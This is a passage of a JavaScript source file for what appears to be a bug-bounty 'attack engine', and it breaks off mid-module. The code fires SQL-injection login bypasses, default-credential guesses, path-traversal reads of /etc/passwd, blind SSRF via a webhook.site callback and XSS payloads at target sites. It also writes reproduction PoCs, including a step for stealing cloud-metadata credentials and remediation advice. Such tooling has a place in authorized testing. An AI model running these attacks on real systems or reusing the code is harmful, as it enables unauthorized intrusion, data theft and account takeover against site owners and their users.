/**
 * Big Bounty v3 — Attack Engine
 * Real bypass attempts with PoC generation. Every confirmed finding includes:
 *   steps[]      — numbered reproduction steps
 *   request      — literal HTTP request that triggered the bypass
 *   evidence     — exact response bytes proving it
 *   curl         — one-liner the client can run to reproduce
 *   fix          — remediation guidance
 * Techniques sourced from: nuclei-templates, sqlmap methodology, dalfox
 * context analysis, interactsh-style OOB (webhook.site), subzy takeover fingerprints.
 */

const UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36';

// ---------------- utils ----------------
function now() { return Date.now(); }

function timeoutFetch(url, opts = {}, ms = 10000) {
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), ms);
  return fetch(url, { ...opts, signal: c.signal, headers: { 'User-Agent': UA, ...(opts.headers || {}) } })
    .finally(() => clearTimeout(t));
}

function rawRequest(method, url, headers = {}, body = null) {
  let s = `${method} ${new URL(url).pathname}${new URL(url).search} HTTP/1.1\nHost: ${new URL(url).host}`;
  for (const [k, v] of Object.entries({ 'User-Agent': UA, ...headers })) s += `\n${k}: ${v}`;
  if (body) s += `\nContent-Length: ${body.length}`;
  s += '\n\n' + (body || '');
  return s;
}

function curlFor(method, url, headers = {}, body = null) {
  const parts = [`curl -sk -X ${method}`, `'${url}'`];
  for (const [k, v] of Object.entries(headers)) if (k.toLowerCase() !== 'user-agent') parts.push(`-H '${k}: ${v}'`);
  if (body) parts.push(`--data-raw '${body.replace(/'/g, "'\\''")}'`);
  return parts.join(' ');
}


function setParam(base, param, value) {
  try {
    const u = new URL(base);
    u.searchParams.set(param, value);
    return u.toString();
  } catch {
    const sep = base.includes('?') ? '&' : '?';
    return `${base}${sep}${param}=${encodeURIComponent(value)}`;
  }
}

async function pLimit(tasks, limit) {
  const out = []; let i = 0;
  const workers = Array.from({ length: Math.min(limit, tasks.length) }, async () => {
    while (i < tasks.length) { const idx = i++; out[idx] = await tasks[idx]().catch((e) => ({ error: String(e) })); }
  });
  await Promise.all(workers);
  return out;
}

function makeFinding(o) {
  return { id: o.id, tool: o.tool, phase: o.phase, severity: o.severity, title: o.title, desc: o.desc || '', evidence: o.evidence, poc: o.poc || null };
}

function makePoc({ steps, request, evidence, curl, fix }) {
  return { steps, request, evidence, curl, fix };
}

// ---------------- 1. Auth bypass (SQLi login bypass + default creds) ----------------
const AUTH_BYPASS_PAYLOADS = [
  ["admin' --", "classic comment-out password"],
  ["admin') --", "parenthesis variant"],
  ["' OR '1'='1' --", "tautology bypass"],
  ["' OR 1=1 -- -", "tautology variant"],
  ["' OR ''='", "empty-string tautology"],
  ["admin' #", "mysql hash comment"],
  ["' OR '1'='1' /*", "c-style comment"],
  ["\" OR \"1\"=\"1\" --", "double-quote variant"],
];
const DEFAULT_CREDS = [
  ['admin', 'admin'], ['admin', 'password'], ['admin', '123456'], ['admin', 'admin123'],
  ['root', 'root'], ['root', 'toor'], ['test', 'test'], ['admin', 'admin@123'], ['user', 'password'], ['admin', '1234'],
];

async function moduleAuthBypass(url, dirFindings) {
  const out = [];
  // find login pages from dir scan + common paths
  const loginPaths = [];
  for (const d of dirFindings || []) {
    if (/login|signin|auth|logon|register|user/i.test(d.path)) loginPaths.push(d.path);
  }
  for (const p of ['/login', '/login.php', '/signin', '/admin/login', '/user/login', '/wp-login.php', '/login.html']) {
    if (!loginPaths.includes(p)) loginPaths.push(p);
  }

  for (const lp of loginPaths.slice(0, 4)) {
    const loginUrl = url.replace(/\/$/, '') + lp;
    let page;
    try { page = await timeoutFetch(loginUrl, {}, 8000); } catch { continue; }
    if (page.status >= 400) continue;
    const html = await page.text().catch(() => '');
    if (!/<input[^>]+type=["']?password/i.test(html)) continue; // not a login form

    // parse form
    const formMatch = html.match(/<form[^>]*>([\s\S]*?)<\/form>/i);
    if (!formMatch) continue;
    const formHtml = formMatch[0];
    const actionM = formHtml.match(/action=["']?([^"'\s>]*)/i);
    const methodM = formHtml.match(/method=["']?([a-z]+)/i);
    const target = actionM && actionM[1] && actionM[1] !== '#'
      ? new URL(actionM[1], loginUrl).href
      : loginUrl;
    const method = (methodM ? methodM[1] : 'post').toUpperCase();

    // collect fields
    const fields = [];
    const inputRe = /<input[^>]*>/gi;
    let im;
    while ((im = inputRe.exec(formHtml))) {
      const tag = im[0];
      const name = (tag.match(/name=["']?([^"'\s>]+)/i) || [])[1];
      const type = (tag.match(/type=["']?([^"'\s>]+)/i) || [])[1] || 'text';
      const value = (tag.match(/value=["']?([^"'\s>]*)/i) || [])[1] || '';
      if (name) fields.push({ name, type, value });
    }
    const userField = fields.find((f) => /user|email|login|uname|username|uid/i.test(f.name));
    const passField = fields.find((f) => f.type === 'password' || /pass|pwd/i.test(f.name));
    if (!passField) continue;
    const hidden = fields.filter((f) => f.type === 'hidden');
    const csrfField = hidden.find((f) => /csrf|token|_token/i.test(f.name));

    // baseline failed login (to distinguish success)
    const buildBody = (u, p) => {
      const fd = new URLSearchParams();
      for (const f of fields) {
        if (f === userField) fd.append(f.name, u);
        else if (f === passField) fd.append(f.name, p);
        else fd.append(f.name, f.value);
      }
      return fd.toString();
    };

    async function tryLogin(u, p) {
      const body = buildBody(u, p);
      const hdrs = { 'Content-Type': 'application/x-www-form-urlencoded', Referer: loginUrl };
      if (csrfField && csrfField.value) hdrs['Cookie'] = '';
      const r = await timeoutFetch(target, { method, headers: hdrs, body, redirect: 'manual' }, 8000);
      const txt = await r.text().catch(() => '');
      const setCookie = r.headers.get('set-cookie') || '';
      const loc = r.headers.get('location') || '';
      return { status: r.status, txt, setCookie, loc };
    }

    const fail = await tryLogin('bbxnosuchuser', 'bbxnosuchpass');
    const failMarker = /invalid|incorrect|wrong|failed|error|incorrect|denied|bad credentials/i.test(fail.txt) || fail.status === 200;
    const failLen = fail.txt.length;

    // A) SQLi auth bypass
    for (const [payload, why] of AUTH_BYPASS_PAYLOADS.slice(0, 6)) {
      const u = userField ? payload : '';
      const p = userField ? `anything' --` : payload; // if only password field, inject there
      const res = await tryLogin(u || payload, userField ? `x' OR '1'='1` : p);
      const success =
        (res.setCookie && /session|token|auth|logged/i.test(res.setCookie) && !fail.setCookie) ||
        (res.status >= 300 && res.status < 400 && res.loc && !/login|error|denied/i.test(res.loc) && fail.loc !== res.loc) ||
        (res.status === 200 && !failMarker && res.txt.length > 0 && Math.abs(res.txt.length - failLen) > 200 && !/invalid|incorrect|wrong/i.test(res.txt));
      if (success) {
        const body = buildBody(u || payload, userField ? `x' OR '1'='1` : p);
        out.push(makeFinding({
          id: `authbypass-sqli-${lp}-${payload.slice(0, 8).replace(/\W/g, '')}`,
          tool: 'auth-bypass', phase: 'login', severity: 'critical',
          title: `AUTHENTICATION BYPASS on ${lp} via SQL injection`,
          desc: `Login form accepts SQL payload in the ${userField ? 'username' : 'password'} field (${why}). The server authenticated us without valid credentials.`,
          evidence: {
            payload,
            httpStatus: res.status,
            redirectLocation: res.loc || '(none)',
            sessionCookieIssued: !!(res.setCookie && !fail.setCookie),
            cookiePreview: (res.setCookie || '').split(';')[0].slice(0, 60),
          },
          poc: makePoc({
            steps: [
              `1. Open ${loginUrl}`,
              `2. Enter \`${u || payload}\` in the ${userField ? 'username' : 'password'} field and \`${userField ? `x' OR '1'='1` : p}\` in the other`,
              `3. Submit — you are logged in as the first user in the database (usually admin)`,
              `4. No credentials required — the SQL query becomes: WHERE user='${u || payload}' AND pass='...' — the OR '1'='1' makes the WHERE clause always true`,
            ],
            request: rawRequest(method, target, { 'Content-Type': 'application/x-www-form-urlencoded' }, body),
            evidence: `HTTP ${res.status}${res.loc ? ' → ' + res.loc : ''}${res.setCookie ? '\nSet-Cookie: ' + res.setCookie.split(';')[0] : ''}`,
            curl: curlFor(method, target, { 'Content-Type': 'application/x-www-form-urlencoded' }, body),
            fix: 'Use parameterized queries (prepared statements) for ALL database access. Never concatenate user input into SQL. Add account lockout + generic error messages.',
          }),
        }));
        break; // one confirmed bypass on this form is enough
      }
    }

    // B) default credentials (top 5 only, gentle)
    let credTried = 0;
    for (const [u, p] of DEFAULT_CREDS.slice(0, 5)) {
      if (credTried >= 5) break;
      credTried++;
      const res = await tryLogin(u, p);
      const success =
        (res.setCookie && /session|token|auth|logged/i.test(res.setCookie) && !fail.setCookie) ||
        (res.status >= 300 && res.status < 400 && res.loc && !/login|error|denied/i.test(res.loc) && fail.loc !== res.loc) ||
        (res.status === 200 && !/invalid|incorrect|wrong|failed/i.test(res.txt) && Math.abs(res.txt.length - failLen) > 300);
      if (success) {
        const body = buildBody(u, p);
        out.push(makeFinding({
          id: `authbypass-default-${lp}-${u}`,
          tool: 'default-creds', phase: 'login', severity: 'critical',
          title: `DEFAULT CREDENTIALS WORK on ${lp} (${u}:${p})`,
          desc: `The login form accepts well-known default credentials. Anyone can log in with these.`,
          evidence: { username: u, password: p, httpStatus: res.status, redirectLocation: res.loc || '(none)', sessionCookieIssued: !!(res.setCookie && !fail.setCookie) },
          poc: makePoc({
            steps: [
              `1. Open ${loginUrl}`,
              `2. Log in with username \`${u}\` password \`${p}\``,
              `3. Full authenticated access granted`,
            ],
            request: rawRequest(method, target, { 'Content-Type': 'application/x-www-form-urlencoded' }, body),
            evidence: `HTTP ${res.status}${res.loc ? ' → ' + res.loc : ''}${res.setCookie ? '\nSet-Cookie: ' + res.setCookie.split(';')[0] : ''}`,
            curl: curlFor(method, target, { 'Content-Type': 'application/x-www-form-urlencoded' }, body),
            fix: 'Change all default credentials immediately. Enforce strong password policy + MFA. Add rate limiting on login endpoints.',
          }),
        }));
        break;
      }
    }
  }
  return out;
}

// ---------------- 2. LFI / Path traversal ----------------
const LFI_PARAMS = ['file', 'path', 'page', 'include', 'template', 'lang', 'doc', 'document', 'view', 'read', 'load', 'show', 'src', 'folder', 'dir', 'cat', 'download', 'attachment'];
const LFI_PAYLOADS = [
  ['../../../../etc/passwd', 'root:x:0:0:', 'plain traversal'],
  ['....//....//....//....//etc/passwd', 'root:x:0:0:', 'dot-dot stripped'],
  ['..%2f..%2f..%2f..%2fetc%2fpasswd', 'root:x:0:0:', 'URL-encoded traversal'],
  ['%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd', 'root:x:0:0:', 'encoded dots'],
  ['....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini', '[extensions]', 'windows traversal'],
  ['php://filter/convert.base64-encode/resource=index', null, 'php filter (source disclosure)'],
  ['/etc/passwd', 'root:x:0:0:', 'absolute path'],
];

async function moduleLfi(url, candidates) {
  const out = [];
  const tasks = [];
  const targets = (candidates && candidates.length ? candidates : [url]).slice(0, 10);
  for (const base of targets) {
  for (const param of LFI_PARAMS.slice(0, 8)) {
    for (const [payload, marker, label] of LFI_PAYLOADS.slice(0, 6)) {
      tasks.push(async () => {
        const testUrl = setParam(base, param, payload);
        let r;
        try { r = await timeoutFetch(testUrl, {}, 7000); } catch { return null; }
        const body = await r.text().catch(() => '');
        let hit = false;
        if (marker === '[extensions]') hit = /\[extensions\]/i.test(body) || /; for 16-bit app support/i.test(body);
        else if (marker) hit = body.includes(marker);
        else hit = /^[A-Za-z0-9+/=\r\n]{80,}$/.test(body.slice(0, 400)) && body.length > 80; // base64 blob = php filter worked
        if (!hit) return null;
        // confirm: does benign value NOT leak? (avoid false positive on pages containing passwd text naturally)
        let benignOk = false;
        try {
          const b = await timeoutFetch(setParam(base, param, 'bbxindex'), {}, 5000);
          const bt = await b.text().catch(() => '');
          benignOk = !(marker && marker !== '[extensions]' && bt.includes(marker));
        } catch { benignOk = true; }
        if (!benignOk && marker) return null;
        return makeFinding({
          id: `lfi-${param}-${label.replace(/\W/g, '')}`,
          tool: 'lfi', phase: 'path-traversal', severity: 'critical',
          title: `LOCAL FILE INCLUSION / PATH TRAVERSAL via "${param}" (${label})`,
          desc: `Parameter "${param}" accepts traversal sequences and returns the contents of server files. Payload: ${payload}`,
          evidence: {
            param, payload,
            matchedMarker: marker || 'base64-encoded source blob',
            responseExcerpt: body.slice(0, 200),
          },
          poc: makePoc({
            steps: [
              `1. Send GET to the target with ${param}=${payload}`,
              `2. Response contains /etc/passwd contents — arbitrary file read confirmed`,
              `3. Same technique reaches any file the web-server user can read (configs, source, .env)`,
            ],
            request: rawRequest('GET', testUrl),
            evidence: body.slice(0, 300),
            curl: curlFor('GET', testUrl),
            fix: 'Reject user input containing path separators. Use an allow-list of permitted filenames. Run app with least-privilege filesystem access. Never pass raw user input to file functions.',
          }),
        });
      });
    }
  }
  const results = await pLimit(tasks, 8);
  return results.filter(Boolean);
  }
}

// ---------------- 3. SQLi deep (boolean-blind + UNION column count) ----------------
const SQL_ERROR_RE = [
  [/you have an error in your sql syntax/i, 'MySQL'], [/warning: mysql_/i, 'MySQL'],
  [/unterminated quoted string/i, 'PostgreSQL'], [/pg_query\(\)/i, 'PostgreSQL'],
  [/microsoft ole db provider for sql server/i, 'MSSQL'], [/unclosed quotation mark after/i, 'MSSQL'],
  [/sqlite3?\..*sqlerror|sqlite_exception/i, 'SQLite'], [/ora-\d{5}/i, 'Oracle'],
  [/mysql_fetch|mysqli?_error/i, 'MySQL'],
];

async function moduleSqliDeep(url) {
  const out = [];
  const baseParams = ['id', 'q', 's', 'search', 'page', 'cat', 'category', 'item', 'product', 'user', 'uid', 'pid', 'news', 'article', 'p', 'name'];
  const canary = (v) => `${url}${url.includes('?') ? '&' : '?'}${v.p}=${encodeURIComponent(v.v)}`;

  // baseline
  let baseline;
  try { baseline = await timeoutFetch(url, {}, 8000); } catch { return out; }
  const baseLen = (await baseline.text().catch(() => '')).length;

  for (const param of baseParams.slice(0, 8)) {
    // error-based
    for (const payload of ["'", "\"", "'", "1'", "1\\) --", "1) AND 1=1 --"]) {
      const testUrl = canary({ p: param, v: payload });
      let r; try { r = await timeoutFetch(testUrl, {}, 7000); } catch { continue; }
      const body = await r.text().catch(() => '');
      for (const [re, db] of SQL_ERROR_RE) {
        if (re.test(body)) {
          out.push(makeFinding({
            id: `sqli-error-${param}-${db}`,
            tool: 'sqli', phase: 'injection', severity: 'critical',
            title: `SQL INJECTION (error-based, ${db}) via parameter "${param}"`,
            desc: `Payload \`${payload}\` caused the database engine to return its error directly in the response — full query manipulation confirmed. An attacker can extract the entire database (credentials, PII) with standard tooling.`,
            evidence: { param, payload, dbms: db, errorSnippet: (body.match(re) || [body.slice(0, 120)])[0].slice(0, 150) },
            poc: makePoc({
              steps: [
                `1. Request: ${param}=${payload}`,
                `2. Application returns a raw ${db} error — user input is concatenated into SQL`,
                `3. Attacker chains UNION SELECT / stacked queries to dump the database`,
              ],
              request: rawRequest('GET', testUrl),
              evidence: (body.match(re) || [body.slice(0, 200)])[0].slice(0, 200),
              curl: curlFor('GET', testUrl),
              fix: 'Parameterized queries everywhere. Suppress DB errors in production (generic error pages). WAF alone is NOT a fix — it is bypassable.',
            }),
          }));
          break;
        }
      }
      if (out.length >= 3) return out; // cap
    }

    // boolean-based blind
    const t1 = await timeoutFetch(canary({ p: param, v: "1' AND '1'='1" }), {}, 7000).then((r) => r.text().catch(() => '')).catch(() => null);
    const t2 = await timeoutFetch(canary({ p: param, v: "1' AND '1'='2" }), {}, 7000).then((r) => r.text().catch(() => '')).catch(() => null);
    if (t1 && t2 && t1.length !== t2.length && Math.abs(t1.length - t2.length) > 50 && Math.abs(t1.length - baseLen) > 50) {
      out.push(makeFinding({
        id: `sqli-blind-${param}`,
        tool: 'sqli', phase: 'injection', severity: 'critical',
        title: `SQL INJECTION (boolean-based blind) via parameter "${param}"`,
        desc: `The query result changes depending on an attacker-controlled boolean condition — even without error messages, the entire database can be extracted character-by-character (binary search). Verified: AND '1'='1 vs AND '1'='2 return different content.`,
        evidence: { param, truePayload: "1' AND '1'='1", falsePayload: "1' AND '1'='2", trueLength: t1.length, falseLength: t2.length, baselineLength: baseLen },
        poc: makePoc({
          steps: [
            `1. Request ${param}=1' AND '1'='1 → response is ${t1.length} bytes`,
            `2. Request ${param}=1' AND '1'='2 → response is ${t2.length} bytes`,
            `3. Difference proves our SQL executes inside their query. Attacker writes AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' loops to dump everything`,
          ],
          request: rawRequest('GET', canary({ p: param, v: "1' AND '1'='2" })),
          evidence: `true-response: ${t1.length} bytes\nfalse-response: ${t2.length} bytes\nbaseline: ${baseLen} bytes`,
          curl: curlFor('GET', canary({ p: param, v: "1' AND '1'='2" })),
          fix: 'Parameterized queries. Also add input validation on numeric fields (cast to int).',
        }),
      }));
      if (out.length >= 4) return out;
    }
  }
  return out;
}

// ---------------- 4. Blind SSRF via OOB callback (webhook.site) ----------------
async function moduleSsrfOob(url) {
  const out = [];
  let token;
  try {
    const r = await fetch('https://webhook.site/token', {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}', signal: AbortSignal.timeout(10000),
    });
    const d = await r.json();
    token = d.uuid;
  } catch { return out; } // webhook.site unavailable — skip silently
  const oobHost = `${token}.webhook.site`;
  const ssrfParams = ['url', 'uri', 'src', 'fetch', 'image', 'img', 'link', 'callback', 'next', 'redirect', 'domain', 'host', 'feed', 'data', 'path', 'proxy', 'load', 'reference', 'site', 'html', 'file'];
  const ssrfPayloads = [
    `https://${oobHost}/bbx-ssrf`,
    `http://${oobHost}/bbx-ssrf`,
    `//${oobHost}/bbx-ssrf`,
  ];

  const tasks = [];
  for (const param of ssrfParams.slice(0, 10)) {
    for (const payload of ssrfPayloads.slice(0, 2)) {
      tasks.push(async () => {
        const testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`;
        try { await timeoutFetch(testUrl, {}, 7000); } catch {}
        return testUrl;
      });
    }
  }
  const fired = await pLimit(tasks, 8);

  // poll for callbacks
  await new Promise((r) => setTimeout(r, 12000));
  try {
    const r = await fetch(`https://webhook.site/token/${token}/requests?sorting=newest`, { signal: AbortSignal.timeout(10000) });
    const d = await r.json();
    const hits = (d.data || []).map((x) => ({ method: x.method, url: x.url, from: x.ip, at: x.created_at }));
    if (hits.length) {
      out.push(makeFinding({
        id: 'ssrf-oob',
        tool: 'ssrf', phase: 'ssrf', severity: 'critical',
        title: 'BLIND SSRF CONFIRMED (out-of-band callback received)',
        desc: `The server made an HTTP request to OUR server (${oobHost}) — proving attacker-controlled URL fetching. This reaches internal services: cloud metadata (169.254.169.254 → cloud credentials), internal admin panels, internal databases.`,
        evidence: { callbacks: hits.slice(0, 5), ourServer: oobHost },
        poc: makePoc({
          steps: [
            `1. We hosted a listener at https://${oobHost}/bbx-ssrf`,
            `2. We submitted that URL into the target's URL/fetch parameters`,
            `3. The target's server connected to our listener — ${hits.length} callback(s) received (see evidence)`,
            `4. Next step for an attacker: request http://169.254.169.254/latest/meta-data/iam/security-credentials/ to steal cloud credentials`,
          ],
          request: rawRequest('GET', fired[0]),
          evidence: `Callback received from target server:\n${JSON.stringify(hits[0], null, 2)}`,
          curl: curlFor('GET', fired[0]),
          fix: 'Never fetch user-supplied URLs directly. Enforce an allow-list of permitted hosts/domains. Block requests to internal IP ranges (169.254.0.0/16, 10.0.0.0/8, 127.0.0.0/8, metadata endpoints). Run outbound fetches from an isolated network segment.',
        }),
      }));
    }
  } catch {}
  return out;
}

// ---------------- 5. Subdomain takeover ----------------
const TAKEOVER_FINGERPRINTS = [
  [/There isn't a GitHub Pages site here\./, 'GitHub Pages'],
  [/fastly error: unknown domain/i, 'Fastly'],
  [/the specified bucket does not exist/i, 'AWS S3'],
  [/404 Not Found.*nginx\/[\d.]+.*heroku/i, 'Heroku'],
  [/herokucdn\.com\/error-pages\/no-such-app\.html/, 'Heroku'],
  [/the request could not be satisfied.*cloudfront/i, 'CloudFront'],
  [/404 Web Site not found.*azure/i, 'Azure'],
  [/domain not found.*shopify/i, 'Shopify'],
  [/repository not found.*netlify/i, 'Netlify'],
  [/not found.*request id:.*\.ghost\.io/i, 'Ghost'],
  [/help center does not exist.*zendesk/i, 'Zendesk'],
  [/there is no app configured at that hostname.*tilda/i, 'Tilda'],
];

async function moduleTakeover(hostname, subdomains) {
  const out = [];
  const targets = subdomains.slice(0, 15);
  for (const sub of targets) {
    try {
      // CNAME lookup via DoH
      const r = await timeoutFetch(`https://dns.google/resolve?name=${sub}&type=CNAME`, {}, 6000);
      const d = await r.json();
      const cname = (d.Answer || []).find((a) => a.type === 5);
      if (!cname) continue;
      const target = cname.data.replace(/\.$/, '');

      // dangling check: does the subdomain serve takeover fingerprint?
      let body = '', status = 0;
      try {
        const resp = await timeoutFetch(`https://${sub}/`, {}, 7000);
        status = resp.status;
        body = await resp.text().catch(() => '');
      } catch {
        // NXDOMAIN / connection refused but CNAME points somewhere = classic dangling
        try {
          const h = await timeoutFetch(`https://dns.google/resolve?name=${sub}&type=A`, {}, 5000);
          const hd = await h.json();
          if (!hd.Answer || hd.Answer.length === 0) status = -1; // truly dangling
        } catch {}
      }

      let service = null;
      for (const [re, name] of TAKEOVER_FINGERPRINTS) {
        if (re.test(body)) { service = name; break; }
      }
      // known-vulnerable CNAME targets even without body match
      const VULN_CNAMES = [
        [/\.s3\.amazonaws\.com$|\.s3-website[-.]/, 'AWS S3'], [/\.herokuapp\.com$/, 'Heroku'],
        [/\.github\.io$/, 'GitHub Pages'], [/\.azurewebsites\.net$/, 'Azure'],
        [/\.cloudfront\.net$/, 'CloudFront'], [/\.myshopify\.com$/, 'Shopify'],
        [/\.netlify\.app$/, 'Netlify'], [/\.ghost\.io$/, 'Ghost'],
        [/\.zendesk\.com$/, 'Zendesk'], [/\.webflow\.io$/, 'Webflow'],
        [/\.readme\.io$/, 'Readme'], [/\.surge\.sh$/, 'Surge'],
      ];
      if (!service) {
        for (const [re, name] of VULN_CNAMES) {
          if (re.test(target)) { service = name; break; }
        }
      }
      if (service && (status === 404 || status === -1 || TAKEOVER_FINGERPRINTS.some(([re]) => re.test(body)))) {
        out.push(makeFinding({
          id: `takeover-${sub}`,
          tool: 'takeover', phase: 'takeover', severity: 'critical',
          title: `SUBDOMAIN TAKEOVER: ${sub} → unclaimed ${service} instance`,
          desc: `${sub} has a CNAME to ${target} (${service}) but no ${service} project is claiming it. We (or anyone) can register that service and serve arbitrary content on YOUR subdomain — cookies for *.domain get stolen, phishing on your brand, full cache poisoning.`,
          evidence: { subdomain: sub, cname: target, service, httpStatus: status === -1 ? 'NXDOMAIN (dangling DNS)' : status, fingerprint: service },
          poc: makePoc({
            steps: [
              `1. DNS: ${sub} CNAME → ${target}`,
              `2. ${target} returns ${status === -1 ? 'NXDOMAIN — the target no longer exists' : 'an unclaimed ' + service + ' error page (HTTP ' + status + ')'}`,
              `3. Anyone can now claim "${target.replace(/^[^.]+\./, '')}" on ${service} and serve JavaScript on https://${sub}`,
              `4. Any cookies scoped to your domain (*.yourdomain) are now readable by the attacker's page`,
            ],
            request: `GET / HTTP/1.1\nHost: ${sub}\n\n→ CNAME lookup: ${sub} → ${target} (${service}) → ${status === -1 ? 'NXDOMAIN' : 'HTTP ' + status + ' unclaimed page'}`,
            evidence: body.slice(0, 200) || `${sub} resolves to ${target} which is unclaimed on ${service}`,
            curl: `dig CNAME ${sub} +short && curl -sk -o /dev/null -w "%{http_code}" https://${sub}/`,
            fix: `Remove the dangling DNS record for ${sub}, or re-claim/verify ${target} on ${service}. Audit ALL DNS records quarterly for dangling entries.`,
          }),
        }));
      }
    } catch {}
  }
  return out;
}

// ---------------- 6. XSS context-aware PoC ----------------
const XSS_PARAMS = ['q', 'search', 'query', 's', 'keyword', 'name', 'message', 'comment', 'text', 'term', 'value', 'email', 'redirect', 'lang', 'page', 'id'];
const XSS_PROBES = [
  ['bbxcanary123">', 'attr'],
  ["bbxcanary123'>", 'attr1'],
  ['<bbxcanary123>', 'tag'],
  ['</textarea><bbxcanary123>', 'textarea'],
  ['";bbxcanary123//', 'js'],
];

async function moduleXssPoc(url) {
  const out = [];
  for (const param of XSS_PARAMS.slice(0, 10)) {
    for (const [probe, ctx] of XSS_PROBES) {
      const testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(probe)}`;
      let r;
      try { r = await timeoutFetch(testUrl, {}, 7000); } catch { continue; }
      const body = await r.text().catch(() => '');
      if (!body.includes(probe)) continue;

      // craft working payload for detected context + verify unencoded reflection
      let payload = null, context = null;
      if (ctx === 'tag' && body.includes('<bbxcanary123>')) {
        payload = '<img src=x onerror=alert(document.domain)>';
        context = 'HTML body — injected as a raw tag';
      } else if (ctx === 'attr' && body.includes('bbxcanary123">')) {
        payload = '"><img src=x onerror=alert(document.domain)>';
        context = 'unquoted/double-quoted HTML attribute';
      } else if (ctx === 'attr1' && body.includes("bbxcanary123'>")) {
        payload = "'><img src=x onerror=alert(document.domain)>";
        context = 'single-quoted HTML attribute';
      } else if (ctx === 'textarea' && body.includes('</textarea><bbxcanary123>')) {
        payload = '</textarea><img src=x onerror=alert(document.domain)>';
        context = 'textarea/RichText context — escapes the container';
      } else if (ctx === 'js' && body.includes('";bbxcanary123//')) {
        payload = '";alert(document.domain)//';
        context = 'JavaScript string context';
      }
      if (!payload) continue;

      const verifyUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`;
      let vBody;
      try {
        const v = await timeoutFetch(verifyUrl, {}, 7000);
        vBody = await v.text().catch(() => '');
      } catch { continue; }
      if (!vBody.includes(payload)) continue; // encoded/filtered — no confirmed PoC

      // where does it land? (before </head> = high impact)
      const headIdx = vBody.toLowerCase().indexOf('</head>');
      const payloadIdx = vBody.indexOf(payload);
      const inHead = headIdx > -1 && payloadIdx > -1 && payloadIdx < headIdx;

      out.push(makeFinding({
        id: `xss-${param}-${ctx}`,
        tool: 'xss', phase: 'xss', severity: inHead ? 'high' : 'medium',
        title: `REFLECTED XSS via "${param}" — working payload returned unencoded`,
        desc: `Parameter "${param}" reflects attacker input unencoded in a ${context}. Payload \`${payload}\` is returned verbatim and executes in the victim's browser when they open the crafted link.`,
        evidence: {
          param, context, payload,
          reflectedIn: inHead ? 'before </head> (executes on every page using this layout)' : 'page body',
          responseExcerpt: vBody.slice(Math.max(0, payloadIdx - 60), payloadIdx + payload.length + 40),
        },
        poc: makePoc({
          steps: [
            `1. Send the victim this link: ${verifyUrl}`,
            `2. The server returns \`${payload}\` unencoded inside a ${context}`,
            `3. Browser executes it — alert(document.domain) fires proving script execution`,
            `4. Real attack replaces alert() with a fetch to attacker server exfiltrating cookies/localStorage`,
          ],
          request: rawRequest('GET', verifyUrl),
          evidence: vBody.slice(Math.max(0, payloadIdx - 80), payloadIdx + payload.length + 60),
          curl: curlFor('GET', verifyUrl),
          fix: 'HTML-encode all user input on output (context-aware: HTML entity encode for body, attribute encoding inside attributes, JSON-safe encoding inside scripts). Add Content-Security-Policy as defense-in-depth.',
        }),
      }));
      return out.slice(0, 3); // one confirmed per param is enough
    }
  }
  return out;
}

// ---------------- 7. Security misconfig bypasses ----------------
async function moduleMisconfigBypass(url, hostname) {
  const out = [];
  const base = url.replace(/\/$/, '');

  // a) directory listing
  for (const p of ['/uploads/', '/backup/', '/files/', '/static/', '/assets/', '/data/', '/.git/', '/logs/']) {
    try {
      const r = await timeoutFetch(base + p, {}, 6000);
      const body = await r.text().catch(() => '');
      if (r.status === 200 && (/<title>Index of|Directory listing for/i.test(body) || (/<a href="\.\.\/">/i.test(body) && /<a href="/i.test(body)))) {
        out.push(makeFinding({
          id: `dirlist-${p.replace(/\W/g, '')}`,
          tool: 'misconfig', phase: 'bypass', severity: 'high',
          title: `DIRECTORY LISTING exposed at ${p}`,
          desc: `${base}${p} lists all files it contains. Attackers browse everything — backups, documents, source archives.`,
          evidence: { path: p, excerpt: body.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').slice(0, 200) },
          poc: makePoc({
            steps: [`1. Open ${base}${p}`, `2. Full file index is rendered — no auth required`],
            request: rawRequest('GET', base + p),
            evidence: body.slice(0, 250),
            curl: curlFor('GET', base + p),
            fix: 'Disable autoindex (nginx: autoindex off; apache: Options -Indexes). Move sensitive files outside webroot.',
          }),
        }));
      }
    } catch {}
  }

  // b) admin panel accessible without auth (no redirect to login)
  for (const p of ['/admin', '/admin/', '/adminpanel/', '/administrator/', '/dashboard/', '/manager/']) {
    try {
      const r = await timeoutFetch(base + p, { redirect: 'manual' }, 6000);
      if (r.status === 200) {
        const body = await r.text().catch(() => '');
        const looksAdmin = /admin|dashboard|panel|control|welcome/i.test(body) && /<html/i.test(body);
        const hasLoginForm = /<input[^>]+type=["']?password/i.test(body);
        if (looksAdmin && !hasLoginForm && body.length > 400) {
          out.push(makeFinding({
            id: `adminopen-${p.replace(/\W/g, '')}`,
            tool: 'misconfig', phase: 'bypass', severity: 'critical',
            title: `ADMIN PANEL ACCESSIBLE WITHOUT AUTHENTICATION: ${p}`,
            desc: `${base}${p} renders admin content with HTTP 200 and no login gate — anyone on the internet gets the admin UI.`,
            evidence: { path: p, status: 200, excerpt: body.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').slice(0, 200) },
            poc: makePoc({
              steps: [`1. Open ${base}${p} in a private window (no cookies, no login)`, `2. Admin interface loads fully — no auth challenge`],
              request: rawRequest('GET', base + p),
              evidence: body.slice(0, 250),
              curl: curlFor('GET', base + p),
              fix: 'Require authentication on ALL admin routes server-side (not just hiding links). Add IP allow-listing for admin areas. Add MFA for admin accounts.',
            }),
          }));
        }
      }
    } catch {}
  }

  // c) HTTP methods abuse + OPTIONS
  try {
    const r = await timeoutFetch(base, { method: 'OPTIONS', redirect: 'manual' }, 6000);
    const allow = r.headers.get('allow') || r.headers.get('access-control-allow-methods') || '';
    if (/trace|put|delete|patch/i.test(allow)) {
      out.push(makeFinding({
        id: 'methods',
        tool: 'misconfig', phase: 'bypass', severity: 'medium',
